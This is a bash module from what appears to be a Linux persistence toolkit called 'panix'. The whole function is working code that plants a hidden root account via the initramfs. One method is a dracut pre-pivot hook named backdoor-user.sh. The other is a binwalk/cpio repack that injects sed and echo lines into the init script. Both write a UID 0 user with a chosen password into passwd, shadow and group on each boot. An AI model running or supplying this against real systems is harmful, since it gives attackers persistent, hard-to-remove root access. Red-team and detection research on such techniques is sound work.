setup_initramfs() {
	# Ensure that only root can run this module.
	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_initramfs() {
		echo "Usage: ./panix.sh --initramfs [OPTIONS]"
		echo ""
		echo "Required options:"
		echo "  --username <name>         Specify the username to be added"
		echo "  --password <password>     Specify the plaintext password for the user"
		echo "  --snapshot yes            Confirm you have a snapshot/backup (for safety)"
		echo ""
		echo "Persistence method (choose exactly one):"
		echo "  --dracut                  Use dracut-based initramfs modification method (requires dracut-core)"
		echo "  --binwalk                 Use binwalk-based initramfs modification method (requires binwalk and initramfs-tools)"
	}

	# Initialize option flags.
	local use_dracut=0
	local use_binwalk=0
	local snapshot=""
	local username=""
	local password=""

	while [[ "$1" != "" ]]; do
		case $1 in
			--dracut)
				use_dracut=1
				;;
			--binwalk)
				use_binwalk=1
				;;
			--username)
				shift
				username="$1"
				;;
			--password)
				shift
				password="$1"
				;;
			--snapshot)
				shift
				snapshot="$1"
				;;
			--help|-h)
				usage_initramfs
				exit 0
				;;
			--examples)
				echo "Examples:"
				echo "sudo ./panix.sh --initramfs --dracut --username panix --password secret --snapshot yes"
				echo "sudo ./panix.sh --initramfs --binwalk --username panix --password secret --snapshot yes"
				exit 0
				;;
			*)
				echo "Invalid option: $1"
				usage_initramfs
				exit 1
				;;
		esac
		shift
	done

	# Ensure exactly one persistence method is chosen.
	if [[ $use_dracut -eq 0 && $use_binwalk -eq 0 ]]; then
		echo "Error: You must specify either --dracut or --binwalk."
		usage_initramfs
		exit 1
	fi
	if [[ $use_dracut -eq 1 && $use_binwalk -eq 1 ]]; then
		echo "Error: You cannot specify both --dracut and --binwalk."
		usage_initramfs
		exit 1
	fi

	# Verify that the required flags are provided.
	if [[ -z "$username" || -z "$password" ]]; then
		echo "Error: You must specify both --username and --password."
		usage_initramfs
		exit 1
	fi

	if [[ "$snapshot" != "yes" ]]; then
		echo "[!] Error: This module is potentially dangerous and can lock you out of your system."
		echo "[!] Learning how to undo the changes in the initramfs rescue shell is great a learning experience however!"
		echo "[!] For safety, you must supply --snapshot yes. Aborting."
		exit 1
	fi

	# Generate the password hash using openssl.
	local user_hash
	user_hash=$(openssl passwd -6 "$password")
	if [[ -z "$user_hash" ]]; then
		echo "Error: Failed to generate password hash."
		exit 1
	fi

	# Escape dollar signs so the hash is stored literally in the injected file.
	local escaped_hash
	escaped_hash=$(echo "$user_hash" | sed 's/\$/\\\$/g')

	#############################
	# Dracut-Based Method
	#############################
	if [[ $use_dracut -eq 1 ]]; then
		if ! command -v dracut &>/dev/null; then
			echo "Error: dracut-core is not installed. Please install it before continuing."
			exit 1
		fi

		if [ -f /etc/os-release ]; then
			. /etc/os-release
		fi
		if [[ "$ID" == "rhel" || "$ID" == "centos" || "$ID" == "fedora" ]]; then
			echo "[!] Warning: This might fail on Red Hat based systems due to differences in initramfs handling."
		fi

		echo "[!] Will inject user '${username}' with hashed password '${user_hash}' (password: '${password}') into the initramfs."

		echo "[!] Preparing Dracut-based initramfs persistence..."
		mkdir -p /usr/lib/dracut/modules.d/99panix || { echo "Error: Could not create /usr/lib/dracut/modules.d/99panix"; exit 1; }
		
		# Create a simple module setup script that uses a single hook.
		cat <<'EOF' > /usr/lib/dracut/modules.d/99panix/module-setup.sh
#!/bin/bash
check()  { return 0; }
depends() { return 0; }
install() {
	inst_hook pre-pivot 99 "$moddir/backdoor-user.sh"
}
EOF
		chmod +x /usr/lib/dracut/modules.d/99panix/module-setup.sh
		echo "[+] Created dracut module setup script at /usr/lib/dracut/modules.d/99panix/module-setup.sh"

		# Create the helper script named backdoor-user.sh.
		cat <<EOF > /usr/lib/dracut/modules.d/99panix/backdoor-user.sh
#!/bin/sh

# Remount the real root if it's read-only
mount -o remount,rw /sysroot 2>/dev/null || {
	echo "[dracut] Could not remount /sysroot as RW. Exiting."
	exit 1
}

# Function to check if a user already exists in a file
check_user_exists() {
	target="\$1"
	file="\$2"
	while read -r line; do
		if echo "\$line" | grep -q "^\$target:"; then
			return 0  # User exists
		fi
	done < "\$file"
	return 1  # User does not exist
}

# Check and add the user to /etc/shadow
if check_user_exists "${username}" /sysroot/etc/shadow; then
	echo "[dracut] User '${username}' already exists in /etc/shadow. Skipping."
else
	echo "${username}:${escaped_hash}:19000:0:99999:7:::" >> /sysroot/etc/shadow
	echo "[dracut] Added '${username}' to /etc/shadow."
fi

# Check and add the user to /etc/passwd
if check_user_exists "${username}" /sysroot/etc/passwd; then
	echo "[dracut] User '${username}' already exists in /etc/passwd. Skipping."
else
	echo "${username}:x:0:0::/root:/bin/bash" >> /sysroot/etc/passwd
	echo "[dracut] Added '${username}' to /etc/passwd."
fi

# Check and add the user to /etc/group
if check_user_exists "${username}" /sysroot/etc/group; then
	echo "[dracut] User '${username}' already exists in /etc/group. Skipping."
else
	echo "${username}:x:1337:" >> /sysroot/etc/group
	echo "[dracut] Added '${username}' to /etc/group."
fi
EOF
		chmod +x /usr/lib/dracut/modules.d/99panix/backdoor-user.sh
		echo "[+] Created dracut helper script at /usr/lib/dracut/modules.d/99panix/backdoor-user.sh"

		echo "[!] Rebuilding initramfs with dracut..."
		dracut --force /boot/initrd.img-$(uname -r) $(uname -r)
		if [[ $? -ne 0 ]]; then
			echo "Error: dracut failed to rebuild initramfs."
			exit 1
		fi
		echo "[+] Dracut rebuild complete."
	fi

	#############################
	# Binwalk-Based Method
	#############################

	# Source: https://breachlabs.io/initramfs-persistence-technique/

	if [[ $use_binwalk -eq 1 ]]; then
		if ! command -v binwalk &>/dev/null || ! command -v unmkinitramfs &>/dev/null; then
			echo "Error: binwalk and/or unmkinitramfs (from initramfs-tools) are not installed."
			exit 1
		fi

		echo "[!] Preparing Binwalk-based initramfs persistence..."
		TMP_DIR=$(mktemp -d /tmp/initramfs.XXXXXX) || { echo "Error: Could not create temporary directory"; exit 1; }
		echo "[!] Temporary directory: $TMP_DIR"

		local INITRD="/boot/initrd.img-$(uname -r)"
		cp "$INITRD" "${INITRD}.bak" || { echo "Error: Could not backup initrd.img"; exit 1; }
		echo "[+] Backup created: ${INITRD}.bak"

		cp "$INITRD" "$TMP_DIR/initrd.img" || { echo "Error: Could not copy initrd.img to temporary directory"; exit 1; }
		cd "$TMP_DIR" || exit 1

		# Use binwalk to determine the trailer address.
		ADDRESS=$(binwalk initrd.img | grep TRAILER | tail -1 | awk '{print $1}')
		if [[ -z "$ADDRESS" ]]; then
			echo "Error: Could not determine trailer address using binwalk."
			exit 1
		fi
		echo "[!] Trailer address: $ADDRESS"

		dd if=initrd.img of=initrd.img-begin count=$ADDRESS bs=1 2>/dev/null || { echo "Error: dd failed (begin)"; exit 1; }

		unmkinitramfs initrd.img initrd_extracted || { echo "Error: unmkinitramfs failed"; exit 1; }
		
		INIT_FILE="initrd_extracted/main/init"
		if [[ ! -f "$INIT_FILE" ]]; then
			echo "Error: Could not find initramfs main/init file."
			exit 1
		fi
		sed -i "/maybe_break init/i mount -o remount,rw \\\${rootmnt}\n\
# Use sed to remove lines starting with $username in /etc/passwd\n\
sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/passwd\n\
# Use sed to remove lines starting with $username in /etc/shadow\n\
sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/shadow\n\
# Use sed to remove lines starting with $username in /etc/group\n\
sed -i \"/^${username}:/d\" \\\${rootmnt}/etc/group\n\
echo \"${username}:x:0:0::/root:/bin/bash\" >> \\\${rootmnt}/etc/passwd\n\
echo '${username}:${user_hash}:19000:0:99999:7:::' >> \\\${rootmnt}/etc/shadow\n\
echo \"${username}:x:1337:\" >> \\\${rootmnt}/etc/group\n" "$INIT_FILE"

		mkdir -p initrd_repacked
		cd initrd_extracted/main || exit 1
		find . | sort | cpio -R 0:0 -o -H newc | gzip > ../../initrd.img-end || { echo "Error: Failed to repack initramfs"; exit 1; }
		cd "$TMP_DIR" || exit 1
		cat initrd.img-begin initrd.img-end > initrd.img-new || { echo "Error: Failed to combine initrd parts"; exit 1; }
		cp initrd.img-new "$INITRD" || { echo "Error: Could not install new initramfs"; exit 1; }
		echo "[+] Binwalk-based initramfs persistence applied. New initramfs installed."

		cd /
		rm -rf "$TMP_DIR"
	fi

	echo "[!] WARNING: Ensure you have a recent snapshot/backup of your system before proceeding."
}
